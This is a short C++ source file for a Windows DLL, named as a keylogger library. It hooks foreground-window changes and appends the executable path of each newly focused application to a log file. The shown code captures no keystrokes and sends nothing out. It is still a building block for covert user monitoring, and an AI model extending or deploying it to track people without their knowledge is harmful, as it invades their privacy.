//cl /EHsc /LD .\keylog_w_lib.cpp /link User32.lib
#include <Windows.h>
#include <fstream>
#include <mutex>
#include <codecvt>
#include <string.h>
#include <psapi.h>
#define DLL_EXPORT __declspec(dllexport)
///////////////////////////////////////////////////////////////////////
std::atomic<bool>* terminationSignal;
HWINEVENTHOOK hook;

std::ofstream outputFile;
std::mutex logMutex;
///////////////////////////////////////////////////////////////////////

void CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime);

///////////////////////////////////////////////////////////////////////

DLL_EXPORT void Initialize(const std::string& filename)
{

    {
        std::lock_guard<std::mutex> lock(logMutex);
        outputFile.open(filename, std::ios::app);
    }

    hook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, NULL, WinEventProc, 0, 0, WINEVENT_OUTOFCONTEXT);
}

DLL_EXPORT void Cleanup(const std::string& filename)
{
    if (hook) UnhookWinEvent(hook);

    {
        std::lock_guard<std::mutex> lock(logMutex);
        outputFile.close();
    }
}

void CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime)
{
    if (event == EVENT_SYSTEM_FOREGROUND) 
    {
        DWORD pid;
        GetWindowThreadProcessId(hwnd, &pid);

        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
        if (hProcess)
        {
            char processName[MAX_PATH];
            if (GetModuleFileNameExA(hProcess, NULL, processName, MAX_PATH))
            {
                //cout << endl << "===============["<< processName << "]===============" << endl;
                outputFile << std::endl << "===============["<< processName << "]===============" << std::endl;
                outputFile.flush();
            }
            CloseHandle(hProcess);
        }
    }
}
